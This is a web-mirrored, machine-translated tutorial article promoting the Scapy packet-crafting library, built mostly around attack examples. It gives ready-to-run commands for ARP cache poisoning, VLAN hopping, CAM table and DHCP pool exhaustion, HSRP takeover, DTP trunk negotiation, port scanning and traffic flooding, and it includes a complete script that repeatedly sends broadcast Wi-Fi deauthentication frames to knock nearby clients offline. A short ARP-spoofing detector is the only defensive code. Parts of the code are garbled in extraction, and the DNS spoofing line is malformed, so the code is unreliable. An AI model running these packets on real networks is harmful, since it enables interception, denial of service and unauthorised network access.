<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Scapy Might</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Scapy is a tool for creating and working with network packages. The program is written in python, by Philippe Biondi. You can get acquainted with the ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Scapy Might</h1><div class="post__text post__text-html js-mediator-article">  <a href="http://www.secdev.org/projects/scapy/">Scapy</a> is a tool for creating and working with network packages.  The program is written in python, by Philippe Biondi.  You can get acquainted with the main functionals <a href="http://habrahabr.ru/company/pentestit/blog/208786/">here</a> .  Scapy is a versatile, truly powerful tool for working with the network and conducting research in the field of information security.  In the article I will try to interest you in using scapy in your work / projects.  I think that this can best be achieved by showing with examples the main advantages of scapy. <br>  As examples, I will take simple and visual tasks that can be solved using scapy.  The main focus will be the formation of packages for the implementation of a particular type of attack. <a name="habracut"></a><br><br><h4>  <a href="https://ru.wikipedia.org/wiki/ARP-spoofing">ARP-spoofing</a> </h4><br><pre><code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span>sendp(Ether(dst=<span class="hljs-string"><span class="hljs-string">'targetMAC'</span></span>)/ARP(op=<span class="hljs-string"><span class="hljs-string">'is-at'</span></span>, psrc=<span class="hljs-string"><span class="hljs-string">'gatewayIP'</span></span>, pdst=<span class="hljs-string"><span class="hljs-string">'targetIP'</span></span>, hwsrc=<span class="hljs-string"><span class="hljs-string">'attackerMAC'</span></span>))</code> </pre>  The package thus formed will poison the arp cache of targetIP.  One of the strongest features of scapy is visibility, that is, you need to understand what you want to do, of course this can create some difficulties, but it will help to create a holistic picture and protect you from a ‚Äúshot in the foot.‚Äù  For example, looking at the packet formed in this way, it becomes clear that ARP-spoofing cannot be cured using port security because the MAC address of the sender does not change, in which case only the arp inspection will save us.  Although let's try to implement protection using scapy.  Suppose that we mirror all switch traffic to the port where we will have an analysis.  I propose to detect an attack on the principle that if the computer did not send an arp request, then it should not receive an arp response. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> scapy.all <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * arp_table = {} <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arp_inspection</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(pkt)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">global</span></span> arp_table op = pkt.getlayer(ARP).op <span class="hljs-comment"><span class="hljs-comment">#   op  ARP,     : &gt;&gt;&gt; ls(ARP) src = pkt.getlayer(Ether).src #  src (MAC source)  Ethernet if op == 1: # op is who-has arp_table[src] = time.time() #  MAC      arp_table if op == 2: # op is is-at dst = pkt.getlayer(Ether).dst if dst in arp_table: time_arp_req = arp_table.pop(dst, None) #   dst  ,     arp_table if int(time.time() - time_arp_req) &gt; 5: print "Alert! Attack from %s" % src else: print "Alert! Attack from %s" % src sniff(filter='arp', prn=arp_inspection)</span></span></code> </pre>  The script fulfills the logic laid down and programs such as ‚Äúcain &amp; abel‚Äù will not be able to silently perform ARP-spoofing.  But we all know that there are features of the implementation of arp in some operating systems, namely, if a computer receives an arp request asking for information about itself, it automatically trusts it and matches the sender's ip-mac to his table.  Those.  The next package will also poison the arp cache. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span>sendp(Ether(dst=<span class="hljs-string"><span class="hljs-string">'targetMAC'</span></span>)/ARP(op=<span class="hljs-string"><span class="hljs-string">'who-has'</span></span>, psrc=<span class="hljs-string"><span class="hljs-string">'gatewayIP'</span></span>, pdst=<span class="hljs-string"><span class="hljs-string">'targetIP'</span></span>))</code> </pre>  In this case, our script will not be effective.  It turns out that working with scapy you study not only the program, but also the protocols themselves, their logic. <br><br><h4>  <a href="http://en.wikipedia.org/wiki/VLAN_hopping">Vlan hooping</a> </h4><br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span>send(Dot1Q(vlan=<span class="hljs-number"><span class="hljs-number">1</span></span>)/Dot1Q(vlan=<span class="hljs-number"><span class="hljs-number">2</span></span>)/IP(dst=<span class="hljs-string"><span class="hljs-string">'targetIP'</span></span>)/ICMP()</code> </pre>  The next advantage of scapy, I think - flexibility.  A classic example (flexibility) is when we need to make arp-spoofing in the next vlan, we don‚Äôt have to write a new program, we need to build the package correctly. <br><br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span>sendp(Ether(dst=<span class="hljs-string"><span class="hljs-string">'clientMAC'</span></span>)/Dot1Q(vlan=<span class="hljs-number"><span class="hljs-number">1</span></span>)/Dot1Q(vlan=<span class="hljs-number"><span class="hljs-number">2</span></span>)/ARP(op=<span class="hljs-string"><span class="hljs-string">'who-has'</span></span>, psrc=<span class="hljs-string"><span class="hljs-string">'gatewayIP'</span></span>, pdst=<span class="hljs-string"><span class="hljs-string">'clientIP'</span></span>))</code> </pre>  Unfortunately, even in case of successful implementation, we will get one-way communication and for the organization of MITM inside the neighboring vlan we will need ‚Äúour agent‚Äù. <br><br><h4>  <a href="http://www.cisco.com/c/en/us/products/collateral/switches/catalyst-6500-series-switches/white_paper_c11_603836.html">CAM Table Overflow</a> </h4><br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span>sendp(Ether(src=RandMAC())/IP(dst=<span class="hljs-string"><span class="hljs-string">'gatewayIP'</span></span>)/ICMP(), loop=<span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre>  RandMAC () - the function returns an arbitrary value, in the format of the MAC address;  loop parameter - loops sending, which ultimately leads to the exhaustion of the switch table buffer.  This is probably an example of the simplicity of the implementation of certain attacks. <br><br><h4>  More examples </h4><br>  Next, I will show examples with little or no description; they are simple and perhaps some of them will serve as a starting point for using scapy in your work.  For example, the exhaustion of the DHCP pool is as follows. <br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span>sendp(Ether(src=RandMAC(),dst=<span class="hljs-string"><span class="hljs-string">'ff:ff:ff:ff:ff:ff'</span></span>)/IP(src=<span class="hljs-string"><span class="hljs-string">'0.0.0.0'</span></span>,dst=<span class="hljs-string"><span class="hljs-string">'255.255.255.255'</span></span>)/UDP(sport=<span class="hljs-number"><span class="hljs-number">68</span></span>,dport=<span class="hljs-number"><span class="hljs-number">67</span></span>)/BOOTP(chaddr=RandMAC())/DHCP(options=[(<span class="hljs-string"><span class="hljs-string">"message-type"</span></span>,<span class="hljs-string"><span class="hljs-string">"discover"</span></span>),<span class="hljs-string"><span class="hljs-string">"end"</span></span>]), loop=<span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br>  <a href="http://en.wikipedia.org/wiki/DNS_spoofing">DNS spoofing</a> is implemented as follows. <br><pre> <code class="python hljs">send(IP(dst=<span class="hljs-string"><span class="hljs-string">'dnsserverIP'</span></span>/UDP(dport=<span class="hljs-number"><span class="hljs-number">53</span></span>)/DNS(qd=DNSQR(qname=<span class="hljs-string"><span class="hljs-string">"google.com"</span></span>)))</code> </pre> <br>  HSRP spoofing <br><pre> <code class="python hljs">sendp(Ether(src=<span class="hljs-string"><span class="hljs-string">'00:00:0C:07:AC:02'</span></span>, dst=<span class="hljs-string"><span class="hljs-string">'01:00:5E:00:00:02'</span></span> )/IP(dst=<span class="hljs-string"><span class="hljs-string">'224.0.0.2'</span></span>, src=<span class="hljs-string"><span class="hljs-string">'attacerIP'</span></span>, ttl=<span class="hljs-number"><span class="hljs-number">1</span></span>)/UDP()/HSRP(priority=<span class="hljs-number"><span class="hljs-number">230</span></span>, virtualIP=<span class="hljs-string"><span class="hljs-string">'virtualIP'</span></span>), inter=<span class="hljs-number"><span class="hljs-number">3</span></span>, loop=<span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre>  src mac - HSRP virtual MAC (possible range 00: 00: 0C: 9F: F0: 00 - 00: 00: 0C: 9F: FF: FF);  dst mac - IP v4 multicast MAC (possible range 01: 00: 5E: 00: 00: 00 - 01: 00: 5E: 00: 00: FF);  ip dst - ipv4 multicast address (224.0.0.0/24);  priority ‚Äî route priority, values ‚Äã‚Äãfrom 0 to 255;  inter = 3 - in accordance with the default interval on the cisco equipment;  all other settings are similar to the default settings of the cisco equipment.  Such a packet will make the attacerIP an active HSRP route. <br>  Various ways to scan ports. <br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span>res = sr1(IP(dst=<span class="hljs-string"><span class="hljs-string">'targetIP'</span></span>)/TCP(dport=<span class="hljs-number"><span class="hljs-number">443</span></span>, flags=<span class="hljs-string"><span class="hljs-string">"S"</span></span>)) <span class="hljs-comment"><span class="hljs-comment"># SYN &gt;&gt;&gt; res = sr1(IP(dst='targetIP')/TCP(dport=443, flags="A")) # ACK &gt;&gt;&gt; res = sr1(IP(dst='targetIP')/TCP(dport=443, flags="FPU")) # Xmas</span></span></code> </pre>  You can see the result in this way. <br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> res.getlayer(TCP).flags == <span class="hljs-number"><span class="hljs-number">0x12</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Open"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> res.getlayer(TCP).flags == <span class="hljs-number"><span class="hljs-number">0x14</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Close"</span></span></code> </pre>  Or so. <br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span>res, unres = sr(IP(dst=<span class="hljs-string"><span class="hljs-string">'targetIP'</span></span>)/TCP(dport=[<span class="hljs-number"><span class="hljs-number">443</span></span>, <span class="hljs-number"><span class="hljs-number">80</span></span>, <span class="hljs-number"><span class="hljs-number">22</span></span>], flags=<span class="hljs-string"><span class="hljs-string">"S"</span></span>)) &gt;&gt;&gt; res.summary(<span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span>(s,r): r.sprintf(<span class="hljs-string"><span class="hljs-string">"%TCP.sport% \t %TCP.flags%"</span></span>) https RA www SA ssh RA</code> </pre><br>  The next positive feature of scapy is the ability to create protocols yourself. The DTP protocol is not implemented as part of the standard set, but it can be loaded as a module. <br><br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span>load_contrib(<span class="hljs-string"><span class="hljs-string">'dtp'</span></span>)</code> </pre>  The danger of DTP is that we can independently switch the switch port to trunk mode and get advanced access.  If you look at the source of the module, we will see there a function that will help us turn on the trunk mode on the interface. <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">negotiate_trunk</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(iface=conf.iface, mymac=str</span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params"><span class="hljs-params">(RandMAC</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params">()</span></span></span></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-params">)</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Trying to negotiate a trunk on interface %s"</span></span> % iface p = Dot3(src=mymac, dst=<span class="hljs-string"><span class="hljs-string">"01:00:0c:cc:cc:cc"</span></span>)/LLC()/SNAP()/DTP(tlvlist=[DTPDomain(),DTPStatus(),DTPType(),DTPNeighbor(neighbor=mymac)]) sendp(p)</code> </pre>  Together with the download of the DTP protocol, we load the negotiate_trunk function, we can execute it directly from the interpreter console and the result will not take long to wait. <br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span>negotiate_trunk()</code> </pre> <br><h4>  802.11 </h4><br>  Scapy can successfully work with wireless networks, in most of its functionality it can replace Aircrack-ng.  For example, you can see the list of available networks. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> scapy.all <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * ap_list = [] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ssid</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(pkt)</span></span></span><span class="hljs-function"> :</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> pkt.haslayer(Dot11) : <span class="hljs-comment"><span class="hljs-comment">#       802.11 if pkt.type == 0 and pkt.subtype == 8: # type 0 subtype 8 -   Beacon (   ) if pkt.addr2 not in ap_list: ap_list.append(pkt.addr2) print "AP: %s SSID: %s" % (ptk.addr2, ptk.info) sniff(iface='mon0', prn=ssid)</span></span></code> </pre>  Pretty simple, let's do something more complicated.  Suppose that you have been given the task of preventing the operation of wireless devices in a controlled area.  How to organize it, if you do not resort to radio frequency silencers?  One option would be to suppress user devices.  You can organize this by sending a package to Deauth clients. <br><div class="spoiler">  <b class="spoiler_title">Broadcast Deauth Packet Script</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> scapy.all <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> random, time, sys <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> multiprocessing <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> Process iface=<span class="hljs-string"><span class="hljs-string">'mon0'</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">wifi_snif</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> pkt = sniff(iface=iface, timeout=<span class="hljs-number"><span class="hljs-number">1</span></span>, lfilter= <span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> x: x.haslayer(Dot11Beacon) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> x.haslayer(Dot11ProbeResp)) u_pkt = [] u_addr2 = [] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> p <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> pkt: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> p.addr2 <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> u_addr2: u_pkt.append(p) u_addr2.append(p.addr2) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> u_pkt <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">deauth</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(pkt)</span></span></span><span class="hljs-function">:</span></span> os.system(<span class="hljs-string"><span class="hljs-string">"iw dev %s set channel %d"</span></span> % (iface, ord(pkt[Dot11Elt:<span class="hljs-number"><span class="hljs-number">3</span></span>].info))) <span class="hljs-comment"><span class="hljs-comment">#     sendp(RadioTap()/Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=pkt.addr2, addr3=pkt.addr3)/Dot11Deauth(),count=4, iface=iface, verbose=0) def chg_cnl(): while True: cnl = random.randrange(1,12) os.system("iw dev %s set channel %d" % (iface, cnl)) time.sleep(0.3) def main_fnc(): p = Process(target=chg_cnl) p.start() pkt_ssid = wifi_snif() p.terminate() for pkt in pkt_ssid: deauth(pkt) while 1: main_fnc()</span></span></code> </pre> </div></div><br>  Beginning researchers can simplify the approach to the tasks of protocol fuzzing, the simplest functionality is implemented in scapy.  For example, the simplest fuzzing Beacon package might look like this. <br><pre> <code class="python hljs">&gt;&gt;&gt;sendp(RadioTap(version=<span class="hljs-number"><span class="hljs-number">0</span></span>, pad=<span class="hljs-number"><span class="hljs-number">0</span></span>)/ Dot11(addr1=<span class="hljs-string"><span class="hljs-string">'ff:ff:ff:ff:ff:ff'</span></span>, addr2=<span class="hljs-string"><span class="hljs-string">'00:c0:ca:76:3d:33'</span></span>, addr3=<span class="hljs-string"><span class="hljs-string">'00:c0:ca:76:3d:33'</span></span>)/ Dot11Beacon(cap=<span class="hljs-string"><span class="hljs-string">"ESS"</span></span>) / fuzz(Dot11Elt(ID=<span class="hljs-string"><span class="hljs-string">"SSID"</span></span>))/ fuzz(Dot11Elt(ID=<span class="hljs-string"><span class="hljs-string">"Rates"</span></span>)/ fuzz(ID=<span class="hljs-string"><span class="hljs-string">"DSset"</span></span>))/ fuzz(Dot11Elt(ID=<span class="hljs-string"><span class="hljs-string">"TIM"</span></span>)), iface=<span class="hljs-string"><span class="hljs-string">"mon0"</span></span>, count=<span class="hljs-number"><span class="hljs-number">10</span></span>, inter=<span class="hljs-number"><span class="hljs-number">0.05</span></span>, verbose=<span class="hljs-number"><span class="hljs-number">0</span></span>)</code> </pre><br><br><h4>  Stress Testing </h4><br>  Last in the list of examples, but by no means least in importance, I will have to use scapy to conduct load testing on communication channels.  I am not an expert in this matter and it is possible that the amount of traffic generated is not the most important parameter, but still.  In scapy this is done simply, like so much more. <br><br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span>sendpfast((Ether(dst=<span class="hljs-string"><span class="hljs-string">'targetMAC'</span></span>)/IP(dst=<span class="hljs-string"><span class="hljs-string">'targetIP'</span></span>)/ICMP(<span class="hljs-string"><span class="hljs-string">'A'</span></span>*<span class="hljs-number"><span class="hljs-number">100</span></span>)*<span class="hljs-number"><span class="hljs-number">100</span></span>, loop=<span class="hljs-number"><span class="hljs-number">1000</span></span>)</code> </pre>  Upon the execution of a command, a similar result should appear. <br><br><img src="https://habrastorage.org/files/f68/23e/433/f6823e433f3b404f80a4991f88a5d8e6.jpg"><br>  On the traffic receiving side, the wireshark meter confirms the sender's numbers. <br><br><img src="https://habrastorage.org/files/124/9e1/705/1249e1705a2e4d6a84c7220bf95081a7.jpg"><br><br><h4>  Results </h4><br>  So, list the advantages. <br>  1) Visibility (understanding of what will happen) <br>  2) Flexibility (packages can be assembled as you like) <br>  3) Extensibility (creating your own protocols) <br>  4) Python <br>  I hope I managed to achieve my goals and, if necessary, you will remember the existence of such a tool as scapy.  If there is interest in the article, I will try to write (translate and adapt) the material on creating your own protocols in scapy. <br><br>  PS <br>  The latest version of scapy can be downloaded from <a href="http://scapy.net/">scapy.net</a> .  The article was used materials official <a href="http://www.secdev.org/projects/scapy/doc/usage.html">documentation</a> scapy. </div><p>Source: <a href="https://habr.com/ru/post/249563/">https://habr.com/ru/post/249563/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../249547/index.html">Two-factor authentication, which is convenient to use</a></li>
<li><a href="../249549/index.html">Monitoring of Cisco network equipment in the Observium system</a></li>
<li><a href="../249553/index.html">How to create a website using YouTube videos as a background?</a></li>
<li><a href="../249555/index.html">What's new in C # 6.0?</a></li>
<li><a href="../249559/index.html">The concept of "fold" is still relevant</a></li>
<li><a href="../249565/index.html">IBM Research announced the launch of an innovative cloud technology to protect personal data</a></li>
<li><a href="../249571/index.html">Native Russian question, or ‚Äúserver for myself‚Äù</a></li>
<li><a href="../249573/index.html">C # for AS3 developers. Part 5: Static Classes, Destructors, and Techniques for Working with Constructors</a></li>
<li><a href="../249575/index.html">Best Practices for SSL / TLS Deployment, Part 1. Theory</a></li>
<li><a href="../249577/index.html">How to connect different types of processes in Microsoft Dynamics CRM 2013. Real business case</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>